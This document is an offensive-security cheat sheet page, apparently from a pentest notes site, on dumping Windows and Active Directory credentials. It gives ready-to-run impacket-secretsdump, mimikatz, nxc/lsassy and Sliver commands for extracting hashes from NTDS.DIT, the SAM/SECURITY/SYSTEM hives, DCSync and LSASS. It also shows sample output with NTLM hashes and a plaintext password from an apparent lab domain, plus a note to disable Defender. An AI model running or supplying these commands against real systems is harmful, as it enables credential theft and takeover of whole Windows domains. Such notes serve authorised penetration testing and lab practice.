---
title: "Secrets Dump"
tags: ["Active Directory", "Secrets Dump", "Credential Dumping", "DCSync", "Domain Controller", "Hive", "Impacket", "LAPS", "NTDS.DIT", "SAM", "SECURITY", "SYSTEM", "Windows"]
---

{{< filter_buttons >}}

#### Convert NTDS.DIT to .sqlite

```console
ntdsdotsqlite ntds.dit --system SYSTEM -o ntds.sqlite
```

<small>*Ref: [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite)*</small>

---

#### With NTDS.DIT and SYSTEM Hive

{{< tab set1 tab1 >}}impacket{{< /tab >}}
{{< tabcontent set1 tab1 >}}

```console
impacket-secretsdump -ntds ntds.dit -system system LOCAL
```

```console {class="sample-code"}
$ impacket-secretsdump -ntds ntds.dit -system system LOCAL
Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7f82cc4be7ee6ca0b417c0719479dbec:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
---[SNIP]---
[*] Cleaning up...
```

{{< /tabcontent >}}

---

#### With SAM, SYSTEM and SECURITY Hives

{{< tab set2 tab1 >}}impacket{{< /tab >}}
{{< tab set2 tab2 >}}mimikatz{{< /tab >}}
{{< tab set2 tab3 >}}sliver{{< /tab >}}
{{< tabcontent set2 tab1 >}}

```console
impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
```

{{< /tabcontent >}}
{{< tabcontent set2 tab2 >}}

```console
reg save HKLM\SYSTEM SYSTEM
```

```console
reg save HKLM\SECURITY SECURITY
```

```console
reg save HKLM\SAM SAM
```

```console
.\mimikatz.exe "lsadump::secrets /system:SYSTEM /security:SECURITY"
```

```console
.\mimikatz.exe "lsadump::sam /system:SYSTEM /sam:SAM"
```

{{< /tabcontent >}}
{{< tabcontent set2 tab3 >}}

```console
execute "powershell" "reg save HKLM\SYSTEM C:\SYSTEM"
```

```console
execute "powershell" "reg save HKLM\SECURITY C:\SECURITY"
```

```console
execute "powershell" "reg save HKLM\SAM C:\SAM"
```

```console
mimikatz -- '"lsadump::secrets /system:C:\SYSTEM /security:C:\SECURITY"'
```

```console
mimikatz -- '"lsadump::sam /system:C:\SYSTEM /sam:C:\SAM"'
```

{{< /tabcontent >}}

---

#### With DCSync Right

{{< tab set3 tab1 >}}impacket{{< /tab >}}
{{< tab set3 tab2 >}}nxc{{< /tab >}}
{{< tab set3 tab3 >}}mimikatz{{< /tab >}}
{{< tab set3 tab4 >}}sliver{{< /tab >}}
{{< tabcontent set3 tab1 >}}

```console {class="password"}
# Password
impacket-secretsdump '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>'
```

```console {class="sample-code"}
$ impacket-secretsdump 'sequel.htb/ryan.cooper:NuclearMosquito3@dc.sequel.htb'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:170710980002a95bc62d176f680a5b40:::
---[SNIP]---
```

```console {class="ntlm"}
# NTLM
impacket-secretsdump '<DOMAIN>/<USER>@<TARGET>' -hashes :<HASH>
```

```console {class="sample-code"}
$ impacket-secretsdump 'sequel.htb/ryan.cooper@dc.sequel.htb' -hashes :98981eed8e9ce0763bb3c5b3c7ed5945
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:170710980002a95bc62d176f680a5b40:::
---[SNIP]---
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
impacket-secretsdump '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>' -k
```

```console {class="sample-code"}
$ impacket-secretsdump 'sequel.htb/ryan.cooper:NuclearMosquito3@dc.sequel.htb' -k
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[-] CCache file is not found. Skipping...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:170710980002a95bc62d176f680a5b40:::
---[SNIP]---
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
impacket-secretsdump '<DOMAIN>/<USER>@<TARGET>' -hashes :<HASH> -k
```

```console {class="sample-code"}
$ impacket-secretsdump 'sequel.htb/ryan.cooper@dc.sequel.htb' -hashes :98981eed8e9ce0763bb3c5b3c7ed5945 -k
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[-] CCache file is not found. Skipping...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:170710980002a95bc62d176f680a5b40:::
---[SNIP]---
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
impacket-secretsdump '<DOMAIN>/<USER>@<TARGET>' -k -no-pass
```

```console {class="sample-code"}
$ impacket-secretsdump 'sequel.htb/ryan.cooper@dc.sequel.htb' -k -no-pass
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:170710980002a95bc62d176f680a5b40:::
---[SNIP]---
```

{{< /tabcontent >}}
{{< tabcontent set3 tab2 >}}

```console {class="password"}
# Password
nxc smb <TARGET> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --ntds
```

```console {class="ntlm"}
# NTLM
nxc smb <TARGET> -d <DOMAIN> -u '<USER>' -H '<HASH>' --ntds
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
nxc smb <TARGET> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --kdcHost <DC> --ntds
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
nxc smb <TARGET> -d <DOMAIN> -u '<USER>' -H '<HASH>' -k --kdcHost <DC> --ntds
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
nxc smb <TARGET> -d <DOMAIN> -u '<USER>' -k --kdcHost <DC> --use-kcache --ntds
```

{{< /tabcontent >}}
{{< tabcontent set3 tab3 >}}

```console
.\mimikatz.exe "lsadump::dcsync /all" "exit"
```

```console
# Dump old creds
.\mimikatz.exe "lsadump::dcsync /user:<DOMAIN>\<USER> /history" "exit"
```

{{< /tabcontent >}}
{{< tabcontent set3 tab4 >}}

```console
mimikatz -- '"lsadump::dcsync /all"' "exit"
```

{{< /tabcontent >}}

---

#### With SYSTEM / Administrator / LAPS

{{< tab set4 tab1 >}}impacket{{< /tab >}}
{{< tab set4 tab2 >}}nxc{{< /tab >}}
{{< tab set4 tab3 >}}mimikatz{{< /tab >}}
{{< tab set4 tab4 >}}sliver{{< /tab >}}
{{< tabcontent set4 tab1 >}}

```console {class="password"}
# Password
impacket-secretsdump '<USER>:<PASSWORD>@<TARGET>'
```

```console {class="ntlm"}
# NTLM
impacket-secretsdump '<USER>@<TARGET>' -hashes :<HASH>
```

{{< /tabcontent >}}
{{< tabcontent set4 tab2 >}}

```console {class="password"}
# Password
nxc smb <TARGET> -u '<USER>' -p '<PASSWORD>' --local-auth -M lsassy 
```

```console {class="ntlm"}
# NTLM
nxc smb <TARGET> -u '<USER>' -H <HASH> --local-auth -M lsassy 
```

<small>*Note: Disable Defender*</small>

{{< /tabcontent >}}
{{< tabcontent set4 tab3 >}}

```console
.\mimikatz.exe "sekurlsa::logonpasswords"
```

```console
.\mimikatz.exe "lsadump::lsa /patch"
```

{{< /tabcontent >}}
{{< tabcontent set4 tab4 >}}

```console
mimikatz -- '"sekurlsa::logonpasswords"'
```

```console
mimikatz -- '"lsadump::lsa /patch"'
```

{{< /tabcontent >}}

<br>